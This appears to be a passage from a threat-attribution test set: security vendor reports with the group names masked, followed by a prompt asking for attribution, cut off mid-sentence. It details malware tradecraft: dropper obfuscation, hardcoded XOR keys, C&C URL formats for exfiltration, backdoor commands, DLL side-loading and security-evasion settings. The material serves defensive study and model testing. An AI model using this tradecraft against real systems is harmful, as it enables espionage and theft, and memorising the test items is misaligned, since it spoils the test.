completed, the threat actor then attempted to move laterally throughout the environment via SMB using Impacket, and ultimately failed to deploy Cobalt Strike despite several attempts. While Rapid7 did not observe successful data exfiltration or ransomware deployment in any of our investigations, the indicators of compromise found via forensic analysis conducted by Rapid7 are consistent with the [PLACEHOLDER] ransomware group based on internal and open source intelligence.  Forensic Analysis In one incident, Rapid7 observed the threat actor attempting to deploy additional remote monitoring and management tools including ScreenConnect and the NetSupport remote access trojan (RAT). Rapid7 acquired the Client32.ini file, which holds the configuration data for the NetSupport RAT, including domains for the connection. Rapid7 observed the NetSupport RAT attempt communication with the following domains:  rewilivak13[.]com greekpool[.]com   Figure 7 - NetSupport RAT Files and Client32.ini Content After successfully gaining access to the compromised asset, Rapid7 observed the threat actor attempting to deploy Cobalt Strike beacons, disguised as a legitimate Dynamic Link Library (DLL) named 7z.DLL, to other assets within the same network as the compromised asset using the Impacket toolset.  In our analysis of 7z.DLL, Rapid7 observed the DLL was altered to include a function whose purpose was to XOR-decrypt the Cobalt Strike beacon using a hard-coded key and then execute the beacon.  The threat actor would attempt to deploy the Cobalt Strike beacon by executing the legitimate binary 7zG.exe and passing a command line argument of `b`, i.e. `C:\Users\Public\7zG.exe b`. By doing so, the legitimate binary 7zG.exe side-loads 7z.DLL, which in turn executes the embedded Cobalt Strike beacon. This technique is known as DLL side-loading, a method Rapid7 previously discussed in a blog post on the IDAT Loader.  Upon successful execution, Rapid7 observed the beacon inject a newly created process, choice.exe.   Figure 8 - Sample Cobalt Strike Configuration Mitigations Rapid7 recommends baselining your environment for all installed remote monitoring and management solutions and utilizing application allowlisting solutions, such as AppLocker or ​​Microsoft Defender Application Control, to block all unapproved RMM solutions from executing within the environment. For example, the Quick Assist tool, quickassist.exe, can be blocked from execution via AppLocker.  As an additional precaution, Rapid7 recommends blocking domains associated with all unapproved RMM solutions. A public GitHub repo containing a catalog of RMM solutions, their binary names, and associated domains can be found here.  Rapid7 recommends ensuring users are aware of established IT channels and communication methods to identify and prevent common social engineering attacks. We also recommend ensuring users are empowered to report suspicious phone calls and texts purporting to be from internal IT staff.
https://www.welivesecurity.com/en/eset-research/oilrigs-outer-space-juicy-mix-same-ol-rig-new-drill-pipes/	[PLACEHOLDER] is a cyberespionage group that has been active since at least 2014 and is commonly believed to be based in Iran. The group targets Middle Eastern governments and a variety of business verticals, including chemical, energy, financial, and telecommunications. [PLACEHOLDER] carried out the DNSpionage campaign in 2018 and 2019, which targeted victims in Lebanon and the United Arab Emirates. In 2019 and 2020, [PLACEHOLDER] continued attacks with the HardPass campaign, which used LinkedIn to target Middle Eastern victims in the energy and government sectors. In 2021, [PLACEHOLDER] updated its DanBot backdoor and began deploying the Shark, Milan, and Marlin backdoors, mentioned in the T3 2021 issue of the ESET Threat Report.    Attribution  The initial link that allowed us to connect the Outer Space campaign to [PLACEHOLDER] is the use of the same custom Chrome data dumper (tracked by ESET researchers under the name MKG) as in the Out to Sea campaign. We observed the Solar backdoor deploy the very same sample of MKG as in Out to Sea on the target’s system, along with two other variants.    Besides the overlap in tools and targeting, we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea, mostly related to upload and download: both Solar and Shark, another [PLACEHOLDER] backdoor, use URIs with simple upload and download schemes to communicate with the C&C server, with a “d” for download and a “u” for upload; additionally, the downloader SC5k uses uploads and downloads subdirectories just like other [PLACEHOLDER] backdoors, namely ALMA, Shark, DanBot, and Milan. These findings serve as a further confirmation that the culprit behind Outer Space is indeed [PLACEHOLDER].    As for the Juicy Mix campaign’s ties to [PLACEHOLDER], besides targeting Israeli organizations – which is typical for this espionage group – there are code similarities between [PLACEHOLDER], the backdoor used in this campaign, and Solar. Moreover, both backdoors were deployed by VBS droppers with the same string obfuscation technique. The choice of post-compromise tools employed in Juicy Mix also mirrors previous [PLACEHOLDER] campaigns.    Outer Space campaign overview  Named for the use of an astronomy-based naming scheme in its function names and tasks, Outer Space is an [PLACEHOLDER] campaign from 2021. In this campaign, the group compromised an Israeli human resources site and subsequently used it as a C&C server for its previously undocumented C#/.NET backdoor, Solar. Solar is a simple backdoor with basic functionality such as reading and writing from disk, and gathering information.    Through Solar, the group then deployed a new downloader SC5k, which uses the Office Exchange Web Services API to download additional tools for execution, as shown in Figure 1. In order to exfiltrate browser data from the victim’s system, [PLACEHOLDER] used a Chrome-data dumper called MKG.    Figure_01_OuterSpace_overview  Figure 1. Overview of [PLACEHOLDER]’s Outer Space compromise chain  Juicy Mix campaign overview  In 2022 [PLACEHOLDER] launched another campaign targeting Israeli organizations, this time with an updated toolset. We named the campaign Juicy Mix for the use of a new [PLACEHOLDER] backdoor, [PLACEHOLDER] (based on its internal assembly name, and its filename, [PLACEHOLDER].exe). In this campaign, the threat actors compromised a legitimate Israeli job portal website for use in C&C communications. The group’s malicious tools were then deployed against a healthcare organization, also based in Israel.    The [PLACEHOLDER] first-stage backdoor is a successor to Solar, also written in C#/.NET, with notable changes that include exfiltration capabilities, use of native APIs, and added detection evasion code.    Along with [PLACEHOLDER], we also detected two previously undocumented browser-data dumpers used to steal cookies, browsing history, and credentials from the Chrome and Edge browsers, and a Windows Credential Manager stealer, all of which we attribute to [PLACEHOLDER]. These tools were all used against the same target as [PLACEHOLDER], as well as at other compromised Israeli organizations throughout 2021 and 2022. Figure 2 shows an overview of how the various components were used in the Juicy Mix campaign.    Figure_01_OuterSpace_overview  Figure 2. Overview of components used in [PLACEHOLDER]’s Juicy Mix campaign  Technical analysis  In this section, we provide a technical analysis of the Solar and [PLACEHOLDER] backdoors and the SC5k downloader, as well as other tools that were deployed to the targeted systems in these campaigns.    VBS droppers  To establish a foothold on the target’s system, Visual Basic Script (VBS) droppers were used in both campaigns, which were very likely spread by spearphishing emails. Our analysis below focuses on the VBS script used to drop [PLACEHOLDER] (SHA-1: 3699B67BF4E381847BF98528F8CE2B966231F01A); note that Solar’s dropper is very similar.    The dropper’s purpose is to deliver the embedded [PLACEHOLDER] backdoor, schedule a task for persistence, and register the compromise with the C&C server. The embedded backdoor is stored as a series of base64 substrings, which are concatenated and base64 decoded. As shown in Figure 3, the script also uses a simple string deobfuscation technique, where strings are assembled using arithmetic operations and the Chr function.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 3. String deobfuscation technique used by [PLACEHOLDER]’s VBS dropper for [PLACEHOLDER]  On top of that, [PLACEHOLDER]’s VBS dropper adds another type of string obfuscation and code to set up persistence and register with the C&C server. As shown in Figure 4, to deobfuscate some strings, the script replaces any characters in the set #*+-_)(}{@$%^& with 0, then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function. For example, the string 116110101109117+99111$68+77{79$68}46-50108109120115}77 translates to Msxml2.DOMDocument.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 4. String obfuscation function used by [PLACEHOLDER]’s VBS dropper  Once the backdoor is embedded on the system, the dropper moves on to create a scheduled task that executes [PLACEHOLDER] (or Solar, in the other version) every 14 minutes. Finally, the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its C&C server.    Solar backdoor  Solar is the backdoor used in [PLACEHOLDER]’s Outer Space campaign. Possessing basic functionalities, this backdoor can be used to, among other things, download and execute files, and automatically exfiltrate staged files.    We chose the name Solar based on the filename used by [PLACEHOLDER], Solar.exe. It is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary (Mercury, Venus, Mars, Earth, and Jupiter).    Solar begins execution by performing the steps shown in Figure 5.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 5. Initial execution flow of Solar  The backdoor creates two tasks, Earth and Venus, that run in memory. There is no stop function for either of the two tasks, so they will run indefinitely. Earth is scheduled to run every 30 seconds and Venus is set to run every 40 seconds.    Earth is the primary task, responsible for the bulk of Solar’s functions. It communicates with the C&C server using the function MercuryToSun, which sends basic system and malware version information to the C&C server and then handles the server’s response. Earth sends the following info to the C&C server:    The string (@) <system hostname>; the whole string is encrypted.  The string 1.0.0.0, encrypted (possibly a version number).  The string 30000, encrypted (possibly the scheduled runtime of Earth in milliseconds).  Encryption and decryption are implemented in functions named JupiterE and JupiterD, respectively. Both of them call a function named JupiterX, which implements an XOR loop as shown in Figure 6.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 6. The for loop in JupiterX that is used to encrypt and decrypt data  The key is derived from a hardcoded global string variable, 6sEj7*0B7#7, and a nonce: in this case, a random hex string from 2–24 characters long. Following the XOR encryption, standard base64 encoding is applied.    An Israeli human resources company’s web server, which [PLACEHOLDER] compromised at some point before deploying Solar, was used as the C&C server:    http://organization.co[.]il/project/templates/office/template.aspx?rt=d&sun=<encrypted_MachineGuid>&rn=<encryption_nonce>    Prior to being appended to the URI, the encryption nonce is encrypted, and the value of the initial query string, rt, is set to d here, likely for “download”.    The last step of the MercuryToSun function is to process a response from the C&C server. It does so by retrieving a substring of the response, which is found between the characters QQ@ and @kk. This response is a string of instructions separated by asterisks (*) that is processed into an array. Earth then carries out the backdoor commands, which include downloading additional payloads from the server, listing files on the victim’s system, and running specific executables.    Command output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce. Then the results are uploaded to the C&C server, thus:    http://organization.co[.]il/project/templates/office/template.aspx?rt=u&sun=<MachineGuid>&rn=<new_nonce>    MachineGuid and the new nonce are encrypted with the JupiterE function, and here the value of rt is set to u, likely for “upload”.    Venus, the other scheduled task, is used for automated data exfiltration. This small task copies the content of files from a directory (also named Venus) to the C&C server. These files are likely dropped here by some other, as yet unidentified, [PLACEHOLDER] tool. After uploading a file, the task deletes it from disk.    [PLACEHOLDER] backdoor  For its Juicy Mix campaign, [PLACEHOLDER] switched from the Solar backdoor to [PLACEHOLDER]. It has a similar workflow to Solar and overlapping capabilities, but there are nevertheless several notable changes:    Use of TLS for C&C communications.  Use of native APIs, rather than .NET APIs, to execute files and shell commands.  Although not actively used, detection evasion code was introduced.  Support for automated exfiltration (Venus in Solar) has been removed; instead, [PLACEHOLDER] supports an additional backdoor command for exfiltrating selected files.  Support for log mode has been removed, and symbol names have been obfuscated.  Contrary to Solar’s astronomy-themed naming scheme, [PLACEHOLDER] obfuscates its symbol names, as can be seen in Figure 7.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 7. Unlike its predecessor Solar (left), [PLACEHOLDER]’s symbols have been obfuscated  Besides the symbol name obfuscation, [PLACEHOLDER] also uses the string stacking method (as shown in Figure 8) to obfuscate strings, which complicates the use of simple detection methods.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 8. [PLACEHOLDER] uses string stacking to obfuscate strings and thwart simple detection mechanisms  Similar to Solar, the [PLACEHOLDER] backdoor starts by creating an in-memory task, scheduled to run indefinitely every 32 seconds. This task communicates with the C&C server and executes backdoor commands, similar to Solar’s Earth task. While Solar also creates Venus, a task for automated exfiltration, this functionality has been replaced in [PLACEHOLDER] by a new backdoor command.    In the main task, [PLACEHOLDER] first generates a victim identifier, <victimID>, to be used in C&C communications. The ID is computed as an MD5 hash of <machine name><username>, formatted as a hexadecimal string.    To request a backdoor command, [PLACEHOLDER] then sends the string d@<victimID>@<machine name>|<username> to the C&C server http://www.darush.co[.]il/ads.asp – a legitimate Israeli job portal, likely compromised by [PLACEHOLDER] before this campaign. We notified the Israeli national CERT organization about the compromise.    The request body is constructed as follows:    The data to be transmitted is XOR encrypted using the encryption key Q&4g, then base64 encoded.  A pseudorandom string of 3–14 characters is generated from this alphabet (as it appears in the code): i8p3aEeKQbN4klFMHmcC2dU9f6gORGIhDBLS0jP5Tn7o1AVJ.  The encrypted data is inserted in a pseudorandom position within the generated string, enclosed between [@ and @] delimiters.  To communicate with its C&C server, [PLACEHOLDER] uses the TLS (Transport Layer Security) protocol, which is used to provide an additional layer of encryption.    Similarly, the backdoor command received from the C&C server is XOR encrypted, base64 encoded, and then enclosed between [@ and @] within the HTTP response body. The command itself is either NCNT (in which case no action is taken), or a string of several parameters delimited by @, as detailed in Table 1, which lists [PLACEHOLDER]’s backdoor commands. Note that <Arg0> is not listed in the table, but is used in the response to the C&C server.    Table 1. List of [PLACEHOLDER]’s backdoor commands    Arg1    Arg2    Arg3    Action taken    Return value    1 or empty string    +sp <optional arguments>    N/A    Executes the specified file/shell command (with the optional arguments), using the native CreateProcess API imported via DllImport. If the arguments contain [s], it is replaced by C:\Windows\System32\.    Command output.    +nu    N/A    Returns the malware version string and C&C URL.    <versionString>|<c2URL>; in this case:    1.0.0|http://www.darush.co[.]il/ads.asp    +fl <optional directory name>    N/A    Enumerates the content of the specified directory (or current working directory).    Directory of <directory path>    For each subdirectory:    <last_write_time> <DIR> <subdirectory name>    For each file:    <last_write_time> FILE <file size> <filename>    <number of subdirectories> Dir(s)    <number of files> File(s)    +dn <file name>    N/A    Uploads the file content to the C&C server via a new HTTP POST request formatted: u@<victimID>@<machine name>|<username>@<file path>@2@<base64encodedFileContent>.    One of:    ·       file[<filename>] is uploaded to server.    ·       file not found!    ·       file path empty!    2    Base64-encoded data    Filename    Dumps the specified data into a file in the working directory.    file downloaded to path[<fullFilePath>]    Each backdoor command is handled in a new thread, and their return values are then base64 encoded and combined with other metadata. Finally, that string is sent to the C&C server using the same protocol and encryption method as described above.    Unused detection evasion technique  Interestingly, we found an unused detection evasion technique within [PLACEHOLDER]. The function responsible for executing files and commands downloaded from the C&C server takes an optional second parameter – a process ID. If set, [PLACEHOLDER] then uses the UpdateProcThreadAttribute API to set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY (0x20007) attribute for the specified process to value: PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x100000000000), as shown in Figure 9.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 9. Unused security product evasion code in [PLACEHOLDER] backdoor  This technique’s goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process. While the parameter was not used in the sample we analyzed, it could be activated in future versions.    Version 1.1.1  Unrelated to the Juicy Mix campaign, in July 2023 we found a new version of the [PLACEHOLDER] backdoor (SHA-1: C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A), uploaded to VirusTotal by several users under the name Menorah.exe. The internal version in this sample was changed from 1.0.0 to 1.1.1, but the only notable change is the use of a different C&C server, http://tecforsc-001-site1.gtempurl[.]com/ads.asp.    Along with this version, we also discovered a Microsoft Word document (SHA-1: 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB) with a malicious macro that drops the backdoor. Figure 10 shows the fake warning message, enticing the user to enable macros for the document, and the decoy content that is displayed afterwards, while the malicious code is running in the background.    Figure_10a_malicious_macro  Figure_10b_decoy_doc  Figure 10. Microsoft Word document with a malicious macro that drops [PLACEHOLDER] v1.1.1    Post-compromise tools  In this section, we review a selection of post-compromise tools used in [PLACEHOLDER]’s Outer Space and Juicy Mix campaigns, aimed at downloading and executing additional payloads, and stealing data from the compromised systems.    SampleCheck5000 (SC5k) downloader  SampleCheck5000 (or SC5k) is a downloader used to download and execute additional [PLACEHOLDER] tools, notable for using the Microsoft Office Exchange Web Services API for C&C communication: the attackers create draft messages in this email account and hide the backdoor commands in there. Subsequently, the downloader logs into the same account, and parses the drafts to retrieve commands and payloads to execute.    SC5k uses predefined values – Microsoft Exchange URL, email address, and password – to log into the remote Exchange server, but it also supports the option to override these values using a configuration file in the current working directory named setting.key. We chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaign.    Once SC5k logs into the remote Exchange server, it retrieves all the emails in the Drafts directory, sorts them by most recent, keeping only the drafts that have attachments. It then iterates over every draft message with an attachment, looking for JSON attachments that contain "data" in the body. It extracts the value from the key data in the JSON file, base64 decodes and decrypts the value, and calls cmd.exe to execute the resulting command line string. SC5k then saves the output of the cmd.exe execution to a local variable.    As the next step in the loop, the downloader reports the results to the [PLACEHOLDER] operators by creating a new email message on the Exchange server and saving it as a draft (not sending), as shown in Figure 11. A similar technique is used to exfiltrate files from a local staging folder. As the last step in the loop, SC5k also logs the command output in an encrypted and compressed format on disk.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 11. Email message creation by SC5k  Browser-data dumpers  It is characteristic of [PLACEHOLDER] operators to use browser-data dumpers in their post-compromise activities. We discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the [PLACEHOLDER] backdoor. They dump the stolen browser data in the %TEMP% directory into files named Cupdate and Eupdate (hence our names for them: CDumper and EDumper).    Both tools are C#/.NET browser-data stealers, collecting cookies, browsing history, and credentials from the Chrome (CDumper) and Edge (EDumper) browsers. We focus our analysis on CDumper, since both stealers are practically identical, save for some constants.    When executed, CDumper creates a list of users with Google Chrome installed. On execution, the stealer connects to the Chrome SQLite Cookies, History and Login Data databases under %APPDATA%\Local\Google\Chrome\User Data, and collects browser data including visited URLs and saved logins, using SQL queries.    The cookie values are then decrypted, and all collected information is added to a log file named C:\Users\<user>\AppData\Local\Temp\Cupdate, in cleartext. This functionality is implemented in CDumper functions named CookieGrab (see Figure 12), HistoryGrab, and PasswordGrab. Note that there is no exfiltration mechanism implemented in CDumper, but [PLACEHOLDER] can exfiltrate selected files via a backdoor command.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 12. CDumper’s CookieGrab function dumps and decrypts cookies from the Chrome data store  In both Outer Space and the earlier Out to Sea campaign, [PLACEHOLDER] used a C/C++ Chrome data dumper called MKG. Like CDumper and EDumper, MKG was also able to steal usernames and passwords, browsing history, and cookies from the browser. This Chrome data dumper is typically deployed in the following file locations (with the first location being the most common):     %USERS%\public\programs\vmwaredir\<random_14_character_string>\mkc.exe  %USERS%\Public\M64.exe  Windows Credential Manager stealer  Besides browser-data dumping tools, [PLACEHOLDER] also used a Windows Credential Manager stealer in the Juicy Mix campaign. This tool steals credentials from Windows Credential Manager, and similar to CDumper and EDumper, stores them in the %TEMP% directory – this time into a file named IUpdate (hence the name IDumper). Unlike CDumper and EDumper, IDumper is implemented as a PowerShell script.    As with the browser dumper tools, it is not uncommon for [PLACEHOLDER] to collect credentials from the Windows Credential Manager. Previously, [PLACEHOLDER]’s operators were observed using VALUEVAULT, a publicly available, Go-compiled credential-theft tool (see the 2019 HardPass campaign and a 2020 campaign), for the same purpose.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: [PLACEHOLDER] is a cyberespionage group that has been active since at least 2014 and is commonly believed to be based in Iran. The group targets Middle Eastern governments and a variety of business verticals, including chemical, energy, financial, and telecommunications. [PLACEHOLDER] carried out the DNSpionage campaign in 2018 and 2019, which targeted victims in Lebanon and the United Arab Emirates. In 2019 and 2020, [PLACEHOLDER] continued attacks with the HardPass campaign, which used LinkedIn to target Middle Eastern victims in the energy and government sectors. In 2021, [PLACEHOLDER] updated its DanBot backdoor and began deploying the Shark, Milan, and Marlin backdoors, mentioned in the T3 2021 issue of the ESET Threat Report.    Attribution  The initial link that allowed us to connect the Outer Space campaign to [PLACEHOLDER] is the use of the same custom Chrome data dumper (tracked by ESET researchers under the name MKG) as in the Out to Sea campaign. We observed the Solar backdoor deploy the very same sample of MKG as in Out to Sea on the target’s system, along with two other variants.    Besides the overlap in tools and targeting, we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea, mostly related to upload and download: both Solar and Shark, another [PLACEHOLDER] backdoor, use URIs with simple upload and download schemes to communicate with the C&C server, with a “d” for download and a “u” for upload; additionally, the downloader SC5k uses uploads and downloads subdirectories just like other [PLACEHOLDER] backdoors, namely ALMA, Shark, DanBot, and Milan. These findings serve as a further confirmation that the culprit behind Outer Space is indeed [PLACEHOLDER].    As for the Juicy Mix campaign’s ties to [PLACEHOLDER], besides targeting Israeli organizations – which is typical for this espionage group – there are code similarities between [PLACEHOLDER], the backdoor used in this campaign, and Solar. Moreover, both backdoors were deployed by VBS droppers with the same string obfuscation technique. The choice of post-compromise tools employed in Juicy Mix also mirrors previous [PLACEHOLDER] campaigns.    Outer Space campaign overview  Named for the use of an astronomy-based naming scheme in its function names and tasks, Outer Space is an [PLACEHOLDER] campaign from 2021. In this campaign, the group compromised an Israeli human resources site and subsequently used it as a C&C server for its previously undocumented C#/.NET backdoor, Solar. Solar is a simple backdoor with basic functionality such as reading and writing from disk, and gathering information.    Through Solar, the group then deployed a new downloader SC5k, which uses the Office Exchange Web Services API to download additional tools for execution, as shown in Figure 1. In order to exfiltrate browser data from the victim’s system, [PLACEHOLDER] used a Chrome-data dumper called MKG.    Figure_01_OuterSpace_overview  Figure 1. Overview of [PLACEHOLDER]’s Outer Space compromise chain  Juicy Mix campaign overview  In 2022 [PLACEHOLDER] launched another campaign targeting Israeli organizations, this time with an updated toolset. We named the campaign Juicy Mix for the use of a new [PLACEHOLDER] backdoor, [PLACEHOLDER] (based on its internal assembly name, and its filename, [PLACEHOLDER].exe). In this campaign, the threat actors compromised a legitimate Israeli job portal website for use in C&C communications. The group’s malicious tools were then deployed against a healthcare organization, also based in Israel.    The [PLACEHOLDER] first-stage backdoor is a successor to Solar, also written in C#/.NET, with notable changes that include exfiltration capabilities, use of native APIs, and added detection evasion code.    Along with [PLACEHOLDER], we also detected two previously undocumented browser-data dumpers used to steal cookies, browsing history, and credentials from the Chrome and Edge browsers, and a Windows Credential Manager stealer, all of which we attribute to [PLACEHOLDER]. These tools were all used against the same target as [PLACEHOLDER], as well as at other compromised Israeli organizations throughout 2021 and 2022. Figure 2 shows an overview of how the various components were used in the Juicy Mix campaign.    Figure_01_OuterSpace_overview  Figure 2. Overview of components used in [PLACEHOLDER]’s Juicy Mix campaign  Technical analysis  In this section, we provide a technical analysis of the Solar and [PLACEHOLDER] backdoors and the SC5k downloader, as well as other tools that were deployed to the targeted systems in these campaigns.    VBS droppers  To establish a foothold on the target’s system, Visual Basic Script (VBS) droppers were used in both campaigns, which were very likely spread by spearphishing emails. Our analysis below focuses on the VBS script used to drop [PLACEHOLDER] (SHA-1: 3699B67BF4E381847BF98528F8CE2B966231F01A); note that Solar’s dropper is very similar.    The dropper’s purpose is to deliver the embedded [PLACEHOLDER] backdoor, schedule a task for persistence, and register the compromise with the C&C server. The embedded backdoor is stored as a series of base64 substrings, which are concatenated and base64 decoded. As shown in Figure 3, the script also uses a simple string deobfuscation technique, where strings are assembled using arithmetic operations and the Chr function.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 3. String deobfuscation technique used by [PLACEHOLDER]’s VBS dropper for [PLACEHOLDER]  On top of that, [PLACEHOLDER]’s VBS dropper adds another type of string obfuscation and code to set up persistence and register with the C&C server. As shown in Figure 4, to deobfuscate some strings, the script replaces any characters in the set #*+-_)(}{@$%^& with 0, then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function. For example, the string 116110101109117+99111$68+77{79$68}46-50108109120115}77 translates to Msxml2.DOMDocument.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 4. String obfuscation function used by [PLACEHOLDER]’s VBS dropper  Once the backdoor is embedded on the system, the dropper moves on to create a scheduled task that executes [PLACEHOLDER] (or Solar, in the other version) every 14 minutes. Finally, the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its C&C server.    Solar backdoor  Solar is the backdoor used in [PLACEHOLDER]’s Outer Space campaign. Possessing basic functionalities, this backdoor can be used to, among other things, download and execute files, and automatically exfiltrate staged files.    We chose the name Solar based on the filename used by [PLACEHOLDER], Solar.exe. It is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary (Mercury, Venus, Mars, Earth, and Jupiter).    Solar begins execution by performing the steps shown in Figure 5.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 5. Initial execution flow of Solar  The backdoor creates two tasks, Earth and Venus, that run in memory. There is no stop function for either of the two tasks, so they will run indefinitely. Earth is scheduled to run every 30 seconds and Venus is set to run every 40 seconds.    Earth is the primary task, responsible for the bulk of Solar’s functions. It communicates with the C&C server using the function MercuryToSun, which sends basic system and malware version information to the C&C server and then handles the server’s response. Earth sends the following info to the C&C server:    The string (@) <system hostname>; the whole string is encrypted.  The string 1.0.0.0, encrypted (possibly a version number).  The string 30000, encrypted (possibly the scheduled runtime of Earth in milliseconds).  Encryption and decryption are implemented in functions named JupiterE and JupiterD, respectively. Both of them call a function named JupiterX, which implements an XOR loop as shown in Figure 6.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 6. The for loop in JupiterX that is used to encrypt and decrypt data  The key is derived from a hardcoded global string variable, 6sEj7*0B7#7, and a nonce: in this case, a random hex string from 2–24 characters long. Following the XOR encryption, standard base64 encoding is applied.    An Israeli human resources company’s web server, which [PLACEHOLDER] compromised at some point before deploying Solar, was used as the C&C server:    http://organization.co[.]il/project/templates/office/template.aspx?rt=d&sun=<encrypted_MachineGuid>&rn=<encryption_nonce>    Prior to being appended to the URI, the encryption nonce is encrypted, and the value of the initial query string, rt, is set to d here, likely for “download”.    The last step of the MercuryToSun function is to process a response from the C&C server. It does so by retrieving a substring of the response, which is found between the characters QQ@ and @kk. This response is a string of instructions separated by asterisks (*) that is processed into an array. Earth then carries out the backdoor commands, which include downloading additional payloads from the server, listing files on the victim’s system, and running specific executables.    Command output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce. Then the results are uploaded to the C&C server, thus:    http://organization.co[.]il/project/templates/office/template.aspx?rt=u&sun=<MachineGuid>&rn=<new_nonce>    MachineGuid and the new nonce are encrypted with the JupiterE function, and here the value of rt is set to u, likely for “upload”.    Venus, the other scheduled task, is used for automated data exfiltration. This small task copies the content of files from a directory (also named Venus) to the C&C server. These files are likely dropped here by some other, as yet unidentified, [PLACEHOLDER] tool. After uploading a file, the task deletes it from disk.    [PLACEHOLDER] backdoor  For its Juicy Mix campaign, [PLACEHOLDER] switched from the Solar backdoor to [PLACEHOLDER]. It has a similar workflow to Solar and overlapping capabilities, but there are nevertheless several notable changes:    Use of TLS for C&C communications.  Use of native APIs, rather than .NET APIs, to execute files and shell commands.  Although not actively used, detection evasion code was introduced.  Support for automated exfiltration (Venus in Solar) has been removed; instead, [PLACEHOLDER] supports an additional backdoor command for exfiltrating selected files.  Support for log mode has been removed, and symbol names have been obfuscated.  Contrary to Solar’s astronomy-themed naming scheme, [PLACEHOLDER] obfuscates its symbol names, as can be seen in Figure 7.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 7. Unlike its predecessor Solar (left), [PLACEHOLDER]’s symbols have been obfuscated  Besides the symbol name obfuscation, [PLACEHOLDER] also uses the string stacking method (as shown in Figure 8) to obfuscate strings, which complicates the use of simple detection methods.    Figure_03_[PLACEHOLDER]_string_obfuscation  Figure 8. [PLACEHOLDER] uses string stacking to obfuscate strings and thwart simple detection mechanisms  Similar to Solar, the [PLACEHOLDER] backdoor starts by creating an in-memory task, scheduled to run indefinitely every 32 seconds. This task communicates with the C&C server and executes backdoor commands, similar to Solar’s Earth task. While Solar also creates Venus, a task for automated exfiltration, this functionality has been replaced in [PLACEHOLDER] by a new backdoor command.    In the main task, [PLACEHOLDER] first generates a victim identifier, <victimID>, to be used in C&C communications. The ID is computed as an MD5 hash of <machine name><username>, formatted as a hexadecimal string.    To request a backdoor command, [PLACEHOLDER] then sends the string d@<victimID>@<machine name>|<username> to the C&C server http://www.darush.co[.]il/ads.asp – a legitimate Israeli job portal, likely compromised by [PLACEHOLDER] before this campaign. We notified the Israeli national CERT organization about the compromise.    The request body is constructed as follows:    The data to be transmitted is XOR encrypted using the encryption key Q&4g, then base64 encoded.  A pseudorandom string of 3–14 characters is generated from this alphabet (as it appears in the code): i8p3aEeKQbN4klFMHmcC2dU9f6gORGIhDBLS0jP5Tn7o1AVJ.  The encrypted data is inserted in a pseudorandom position within the generated string, enclosed between [@ and @] delimiters.  To communicate with its C&C server, [PLACEHOLDER] uses the TLS (Transport Layer Security) protocol, which is used to provide an additional layer of encryption.    Similarly, the backdoor command received from the C&C server is XOR encrypted, base64 encoded, and then enclosed between [@ and @] within the HTTP response body. The command itself is either NCNT (in which case no action is taken), or a string of several parameters delimited by @, as detailed in Table 1, which lists [PLACEHOLDER]’s backdoor commands. Note that <Arg0> is not listed in the table, but is used in the response to the C&C server.    Table 1. List of [PLACEHOLDER]’s backdoor commands    Arg1    Arg2    Arg3    Action taken    Return value    1 or empty string    +sp <optional arguments>    N/A    Executes the specified file/shell command (with the optional arguments), using the native CreateProcess API imported via DllImport. If the arguments contain [s], it is replaced by C:\Windows\System32\.    Command output.    +nu    N/A    Returns the malware version string and C&C URL.    <versionString>|<c2URL>; in this case:    1.0.0|http://www.darush.co[.]il/ads.asp    +fl <optional directory name>    N/A    Enumerates the content of the specified directory (or current working directory).    Directory of <directory path>    For each subdirectory:    <last_write_time> <DIR> <subdirectory name>    For each file:    <last_write_time> FILE <file size> <filename>    <number of subdirectories> Dir(s)    <number of files> File(s)    +dn <file name>    N/A    Uploads the file content to the C&C server via a new HTTP POST request formatted: u@<victimID>@<machine name>|<username>@<file path>@2@<base64encodedFileContent>.    One of:    ·       file[<filename>] is uploaded to server.    ·       file not found!    ·       file path empty!    2    Base64-encoded data    Filename    Dumps the specified data into a file in the working directory.    file downloaded to path[<fullFilePath>]    Each backdoor command is handled in a new thread, and their return values are then base64 encoded and combined with other metadata. Finally, that string is sent to the C&C server using the same protocol and encryption method as described above.    Unused detection evasion technique  Interestingly, we found an unused detection evasion technique within [PLACEHOLDER]. The function responsible for executing files and commands downloaded from the C&C server takes an optional second parameter – a process ID. If set, [PLACEHOLDER] then uses the UpdateProcThreadAttribute API to set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY (0x20007) attribute for the specified process to value: 